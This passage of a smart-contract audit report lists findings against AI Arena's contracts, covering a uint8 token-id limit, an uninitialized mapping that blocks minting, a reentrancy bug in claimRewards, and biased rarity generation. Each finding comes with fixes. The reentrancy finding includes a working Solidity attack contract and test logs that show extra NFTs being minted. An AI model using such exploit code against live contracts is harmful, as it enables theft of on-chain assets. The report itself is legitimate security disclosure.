*Submitted by [abhishek\_thaku\_r](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68), also found by [pontifex](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1902), [Fulum](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1817), [0xDetermination](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1768), [Greed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1675), [givn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1662), [stakog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1459), [offside0011](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1401), [maxim371](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1317), [ktg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1303), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1299), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1267), [sashik\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1210), [korok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1072), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/990), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/945), [PoeAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/941), [Tychai0s](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/875), [ahmedaghadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/869), [kartik\_giri\_47538](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/617), [iamandreiski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/579), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/530), [0xAlix2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/433), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/407), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/310), [0xShitgem](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/298), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/240), [kiqo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/82), and [swizz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2066)*

`FighterFarm::reRoll` uses uint8 for nft id as input, which will stop people calling this function who owns id greater than 255. It will lead to not being able to use the reRoll to get random traits, which could have been better for there game performance.

### Proof of Concept

Affect code can be [seen here](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L370-L391).

Adding code snippet below as well, for better clarity:

```solidity
    /// @notice Rolls a new fighter with random traits.
    /// @param tokenId ID of the fighter being re-rolled.
    /// @param fighterType The fighter type.
@>    function reRoll(uint8 tokenId, uint8 fighterType) public {
        require(msg.sender == ownerOf(tokenId));
        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");

        _neuronInstance.approveSpender(msg.sender, rerollCost);
        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
        if (success) {
            numRerolls[tokenId] += 1;
            uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));
            (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
            fighters[tokenId].element = element;
            fighters[tokenId].weight = weight;
            fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
                newDna,
                generation[fighterType],
                fighters[tokenId].iconsType,
                fighters[tokenId].dendroidBool
            );
            _tokenURIs[tokenId] = "";
        }
    }   
```

If you notice the highlighted line (first line of function), it takes `uint8` as input for `tokenId` parameter. Which will restrict users to call this function when they own nft id greater than 255.

Value will go out of bounds when user will input 256 or more.

### Recommended Mitigation Steps

Use uint256 for nft id input to fix the issue.

```diff
- function reRoll(uint8 tokenId, uint8 fighterType) public {
+ function reRoll(uint256 tokenId, uint8 fighterType) public {
   require(msg.sender == ownerOf(tokenId));
        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");

        _neuronInstance.approveSpender(msg.sender, rerollCost);
        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);
        if (success) {
            numRerolls[tokenId] += 1;
            uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));
            (uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);
            fighters[tokenId].element = element;
            fighters[tokenId].weight = weight;
            fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(
                newDna,
                generation[fighterType],
                fighters[tokenId].iconsType,
                fighters[tokenId].dendroidBool
            );
            _tokenURIs[tokenId] = "";
        }
    }
```

**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68#issuecomment-1958376082):**
 > Unsigned integer type limitation indeed.

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/68#issuecomment-1975477042)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> Fixed reRoll for fighters with tokenIds greater than 255.<br>
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/1

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/12), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/45), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/2).



***

## [[H-07] Fighters cannot be minted after the initial generation due to uninitialized `numElements` mapping](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45)
*Submitted by [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45), also found by [visualbits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2003), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1963), [sandy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1948), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1919), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1832), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1693), [DarkTower](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1690), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1594), [0xStriker](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1580), DanielArmstrong ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1547), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/286)), [14si2o\_Flint](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1479), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1435), [Ryonen](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1425), [KupiaSec](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1378), [Topmark](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1294), [0xmystery](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1290), [AgileJune](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1280), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1270), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1268), [sashik\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1218), [soliditywala](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1215), [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1141), [0xaghas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1116), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1088), [VrONTg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1060), [Krace](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1052), [ke1caM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1033), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1008), [petro\_1912](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/980), [PoeAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/943), [ktg](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/930), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/915), [Tychai0s](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/863), [EagleSecurity](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/819), [lil\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/815), [0xvj](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/781), [\_eperezok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/772), [pkqs90](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/764), [pynschon](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/638), [peter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/630), [Aamir](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/556), [sl1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/526), [0xAlix2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/522), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/517), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/468), [blutorque](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/449), [cartlex\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/420), [Giorgio](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/410), [radin100](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/294), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/290), [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/283), [WoolCentaur](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/282), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/249), [aslanbek](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/140), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/130), [0xbranded](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/78), [Varun\_05](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1535), [d3e4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1982), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1628), [0xlamide](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1281), [Aymen0909](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1255), [btk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/861), [devblixt](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/455), and [ubl4nk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/400)*

In `FighterFarm.sol` there is a mapping `numElements` which stores the number of possible types of elements a fighter can have in a generation:

[FighterFarm.sol#L84-L85](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L84-L85)

```solidity
    /// @notice Mapping of number elements by generation.
    mapping(uint8 => uint8) public numElements;
```

But the problem here is that only the initial generation, Generation 0, is initialized to 3, in the `numElements` mapping during the constructor of `FighterFarm.sol`.

[FighterFarm.sol#L100-L111](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L100-L111)

```solidity
    /// @notice Sets the owner address, the delegated address.
    /// @param ownerAddress Address of contract deployer.
    /// @param delegatedAddress Address of delegated signer for messages.
    /// @param treasuryAddress_ Community treasury address.
    constructor(address ownerAddress, address delegatedAddress, address treasuryAddress_)
        ERC721("AI Arena Fighter", "FTR")
    {
        _ownerAddress = ownerAddress;
        _delegatedAddress = delegatedAddress;
        treasuryAddress = treasuryAddress_;
        numElements[0] = 3;
    } 
```

It is therefore not possible to write to the `numElements` mapping for any other generations. As they are uninitialized, `numElements[i] = 0` when `i != 0`

Moreover, this `numElements` mapping is read from when creating a fighter.

[FighterFarm.sol#L458-L474](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L458-L474)

```solidity
    /// @notice Creates the base attributes for the fighter.
    /// @param dna The dna of the fighter.
    /// @param fighterType The type of the fighter.
    /// @return Attributes of the new fighter: element, weight, and dna.
    function _createFighterBase(
        uint256 dna, 
        uint8 fighterType
    ) 
        private 
        view 
        returns (uint256, uint256, uint256) 
    {
=>      uint256 element = dna % numElements[generation[fighterType]]; // numElements is 0 when generation[fighterType] != 0.
        uint256 weight = dna % 31 + 65;
        uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);
        return (element, weight, newDna);
    }
```

Therefore if the protocol updates to a new generation of fighters, it will not be able to create anymore new fighters as `numElements[generation[fighterType]]` will be uninitialized and therefore equal 0. This will cause the transaction to always revert as any modulo by 0 will cause a panic [according to Solidity Docs](https://docs.soliditylang.org/en/latest/types.html#:\~:text=Modulo%20with%20zero%20causes%20a%20Panic%20error.%20This%20check%20can%20not%20be%20disabled%20through%20unchecked%20%7B%20...%20%7D.)

> Modulo with zero causes a Panic error. This check can not be disabled through unchecked { ... }.

### Recommended Mitigation Steps

Allow the admin to update the `numElements` mapping when a new generation is created.

**[raymondfam (lookout) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45#issuecomment-1960006144):**
 > Missing `numElements[generation[fighterType]]` setter.

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/45#issuecomment-1984292251)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/7

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/23), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/46), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/26).



***

## [[H-08] Player can mint more fighter NFTs during claim of rewards by leveraging reentrancy on the `claimRewards() function`](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37)
*Submitted by [DarkTower](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37), also found by [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1881), [0brxce](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1852), [BoRonGod](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1812), [0xDetermination](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1774), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1721), [grearlake](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1700), [PedroZurdo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1643), [BARW](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1588), [sl1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1467), [Krace](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1335), [Zac](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1334), [Tricko](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1288), [Aymen0909](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1278), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1265), [rouhsamad](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1233), [sashik\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1203), [ke1caM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1027), [0xCiphky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/913), [MrPotatoMagic](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/903), [jnforja](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/873), [0xBinChook](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/830), [web3pwn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/745), [0xLogos](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/719), [bhilare\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/692), [Kow](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/548), [ubl4nk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/534), [zxriptor](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/441), [djxploit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/426), [solmaxis69](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/263), [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/201), [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/96), and [ZanyBonzy](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2050)*

When a fighting round ends, winners for the current round get picked and allocated respective rewards. These rewards are fighter NFTs that can be claimed by such winners. When you claim your rewards for a round or several rounds, the `numRoundsClaimed` state variable which stores the number of rounds you've claimed for gets updated to reflect your claim and each winner can only ever claim up to the amounts they win for each given round. That means if you try to batch-claim for two given rounds for which you won 2 fighter NFTs, your NFT count after the claim should be whatever your current balance of NFT is plus 2 fighter NFTs.

The issue here is that there's a way to mint additional fighter NFTs on top of the fighter NFTs you're owed for winning even though the `claimRewards` function has implemented a decent system to prevent over-claims. For one, it's relatively complex to spoof a call pretending to be the `_mergingPoolAddress` to mint but a malicious user doesn't need to worry too much about that to mint more fighters; they just need to leverage using a smart contract for engineering a simple reentrancy.

### Proof of Concept

Consider this call path that allows a malicious user to reach this undesired state:

1.  In-session fight round gets finalized.
2.  An admin picks winners for the just finalized round.
3.  Alice, one of the winners is entitled to 2 fighter NFTs just like Bob and decides to claim rewards for the rounds she participated in but keep in mind she joined the game with a smart contract.
4.  Alice calls `claimRewards` supplying the args `(string[] calldata modelURIs, string[] calldata modelTypes, uint256[2][] calldata customAttributes)`
5.  Those are valid arguments, hence the loop proceeds to make 2 NFT mints to her address.
6.  Her address, being a smart contract manages to reenter the call to mint additional NFTs.
7.  Alice ends up with more fighter NFTs instead of 2. Bob, who is an EOA gets the 2 NFTs he's owed but Alice has managed to gain more.

The root cause of this issue stems from the `roundId`. The amount of times you can reenter the `claimRewards` function depends on the `roundId`. So let's say the `roundId` is 3, it mints 6 NFTs:

*   First loop mints once
*   Reenter mints the second time
*   Reenter again mints the third time
*   Cannot reenter anymore
*   Control is released so the call goes back to the second loop & finishes the mint
*   Call goes back & finishes the second and third mint
*   Alice or malicious caller ends up with 6 NFTs instead of 3

Here's a POC to show one such attack path in the code
Place the code in the `MergingPool.t.sol` test contract and do the setup: `testReenterPOC` is the attack POC test

Attack contract:

<details>

```js
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
contract Attack is IERC721Receiver {
    
    address owner;
    uint256 tickets = 0;
    MergingPool mergingPool;
    FighterFarm fighterFarm;

    constructor(address mergingPool_, address fighterFarm_) {
        mergingPool = MergingPool(mergingPool_);
        fighterFarm = FighterFarm(fighterFarm_);
        owner = msg.sender;
    }
    function reenter() internal {
        ++tickets;
        if (tickets < 100) {
            (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
            mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
        }
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) public returns (bytes4) {
        reenter();
        return IERC721Receiver.onERC721Received.selector;
    }
    function attack() public {
        (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
        mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
    } 

    function setInformation() public pure returns (string[] memory, string[] memory, uint256[2][] memory) {
        string[] memory _modelURIs = new string[](3);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[2] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        string[] memory _modelTypes = new string[](3);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        _modelTypes[2] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](3);
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);
        _customAttributes[2][0] = uint256(1);
        _customAttributes[2][1] = uint256(80);

        return (_modelURIs, _modelTypes, _customAttributes);
    }  
}
```

```js
    function testReenterPOC() public {

        address Bob = makeAddr("Bob");
        Attack attacker = new Attack(address(_mergingPoolContract), address(_fighterFarmContract));
        
        _mintFromMergingPool(address(attacker));
        _mintFromMergingPool(Bob);

        assertEq(_fighterFarmContract.ownerOf(0), address(attacker));
        assertEq(_fighterFarmContract.ownerOf(1), Bob);

        uint256[] memory _winners = new uint256[](2);
        _winners[0] = 0;
        _winners[1] = 1;

         // winners of roundId 0 are picked
        _mergingPoolContract.pickWinner(_winners);
        assertEq(_mergingPoolContract.isSelectionComplete(0), true);  
        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == address(attacker), true);
        // winner matches ownerOf tokenId
        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == Bob, true);

        string[] memory _modelURIs = new string[](2);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        
        string[] memory _modelTypes = new string[](2);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](2);
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);
        // winners of roundId 1 are picked

        uint256 numberOfRounds = _mergingPoolContract.roundId();
        console.log("Number of Rounds: ", numberOfRounds);

        _mergingPoolContract.pickWinner(_winners);
        _mergingPoolContract.pickWinner(_winners);

        console.log("------------------------------------------------------");

        console.log("Balance of attacker (Alice) address pre-claim rewards: ", _fighterFarmContract.balanceOf(address(attacker)));
        // console.log("Balance of Bob address pre-claim rewards: ", _fighterFarmContract.balanceOf(Bob));


        uint256 numRewardsForAttacker = _mergingPoolContract.getUnclaimedRewards(address(attacker));
        
        // uint256 numRewardsForBob = _mergingPoolContract.getUnclaimedRewards(Bob);

        console.log("------------------------------------------------------");

        console.log("Number of unclaimed rewards attacker (Alice) address has a claim to: ", numRewardsForAttacker);
        // console.log("Number of unclaimed rewards Bob address has a claim to: ", numRewardsForBob);
        
        // vm.prank(Bob);
        // _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);

        vm.prank(address(attacker));
        attacker.attack();

        uint256 balanceOfAttackerPostClaim = _fighterFarmContract.balanceOf(address(attacker));

        console.log("------------------------------------------------------");
        console.log("Balance of attacker (Alice) address post-claim rewards: ", balanceOfAttackerPostClaim);
        // console.log("Balance of Bob address post-claim rewards: ", _fighterFarmContract.balanceOf(Bob));

    }
```
</details>

Malicious user leveraging reentrancy test result:

<details>

```js
[PASS] testReenterPOC() (gas: 3999505)
Logs:
  Number of Rounds:  1
  ------------------------------------------------------
  Balance of attacker (Alice) address pre-claim rewards:  1
  ------------------------------------------------------
  Number of unclaimed rewards attacker (Alice) address has a claim to:  3
  ------------------------------------------------------
  Balance of attacker (Alice) address post-claim rewards:  7
```

Non-malicious users test POC:

```js
function testNormalEOAClaim() public {
        _mintFromMergingPool(_ownerAddress);
        _mintFromMergingPool(_DELEGATED_ADDRESS);
        
        assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);
        assertEq(_fighterFarmContract.ownerOf(1), _DELEGATED_ADDRESS);

        uint256[] memory _winners = new uint256[](2);
        _winners[0] = 0;
        _winners[1] = 1;

        // winners of roundId 0 are picked
        _mergingPoolContract.pickWinner(_winners);
        assertEq(_mergingPoolContract.isSelectionComplete(0), true);
        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);
        // winner matches ownerOf tokenId
        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == _DELEGATED_ADDRESS, true);

        string[] memory _modelURIs = new string[](2);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";

        string[] memory _modelTypes = new string[](2);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](2);
        _customAttributes[0][0] = uint256(1);
        _customAttributes[0][1] = uint256(80);
        _customAttributes[1][0] = uint256(1);
        _customAttributes[1][1] = uint256(80);
        // winners of roundId 1 are picked

        uint256 numberOfRounds = _mergingPoolContract.roundId();
        console.log("Number of Rounds: ", numberOfRounds);

        _mergingPoolContract.pickWinner(_winners);

        console.log("Balance of owner address pre-claim rewards: ", _fighterFarmContract.balanceOf(address(this)));
        console.log("Balance of delegated address pre-claim rewards: ", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));


        uint256 numRewardsForWinner = _mergingPoolContract.getUnclaimedRewards(_ownerAddress);
        
        uint256 numRewardsForDelegated = _mergingPoolContract.getUnclaimedRewards(_DELEGATED_ADDRESS);
        // emit log_uint(numRewardsForWinner);

        console.log("Number of unclaimed rewards owner address has a claim to: ", numRewardsForWinner);
        console.log("Number of unclaimed rewards delegated address has a claim to: ", numRewardsForDelegated);

        // winner claims rewards for previous roundIds
        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);
        vm.prank(_DELEGATED_ADDRESS);
        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);

        console.log("Balance of owner address post-claim rewards: ", _fighterFarmContract.balanceOf(address(this)));
        console.log("Balance of delegated address post-claim rewards: ", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));
    }
```
</details>

Non-malicious users doing a normal claim result:

```js
[PASS] testNormalEOAClaim() (gas: 2673123)
Logs:
  Number of Rounds:  1
  Balance of owner address pre-claim rewards:  1
  Balance of delegated address pre-claim rewards:  1
  Number of unclaimed rewards owner address has a claim to:  2
  Number of unclaimed rewards delegated address has a claim to:  2
  Balance of owner address post-claim rewards:  3
  Balance of delegated address post-claim rewards:  3
```

### Recommended Mitigation Steps

Use a `nonReentrant` modifier for the `claimRewards` function.

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37#issuecomment-1975461186)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/6

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/28), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/47), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/27).



***

 
# Medium Risk Findings (9)
## [[M-01] Almost all rarity rank combinations cannot be, and are not uniformly, generated](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1979)
*Submitted by [d3e4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1979), also found by [niser93](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1456) and [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/440)*

Only a tiny fraction, 0.0002427\%, of all rarity rank combinations are possible.
The probability distribution of the possible combinations (assuming the DNA is uniformly random) is not uniform: 24\% of combinations are twice as likely as the rest.

### Proof of Concept

`AiArenaHelper.createPhysicalAttributes()` may set six `finalAttributeProbabilityIndexes` using [the following calculation](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L107-L109).

```solidity
uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;
uint256 attributeIndex = dnaToIndex(generation, rarityRank, attributes[i]);
finalAttributeProbabilityIndexes[i] = attributeIndex;
```

`attributeToDnaDivisor` [is by default `[2, 3, 5, 7, 11, 13]`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/AiArenaHelper.sol#L20). Each `rarityRank` by itself is in the range `0..99`, and ostensibly the total number of combinations of the six `rarityRank`s should then be 100\^6. However, only 2,427,000 different combinations are possible, which is only 0.0002427\% of all combinations that should be possible.

As a function of `dna` the vector of the six `rarityRank`s repeats every 3,003,000 integers (=2 &bull; 3 &bull; 5 &bull; 7 &bull; 11 &bull; 13 &bull; 100). But it turns out that 576,000 of these appear twice. For example, a `dna` of `0` or `1` yield the same combination of `rarityRank`s (`[0,0,0,0,0,0]`), as do `16` and `17` (`[8,5,3,2,1,1]`), and `22` and `23` (`[11,7,4,3,2,1]`), etc.
That is, about 24\% of the combinations are twice as likely as the rest.

The `rarityRank`s are input to `dnaToIndex()` which then will also be biased and restricted in output (depending on the attribute probabilities).

### Recommended Mitigation Steps

Extract multiple small random numbers by repeatedly taking the modulo and dividing. I.e.

```diff
- uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;
+ uint256 rarityRank = dna % 100;
+ dna /= 100;
```

**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1979#issuecomment-1999028030):**
 > Agree that `rarityRank` determination isn't uniformly random.



***

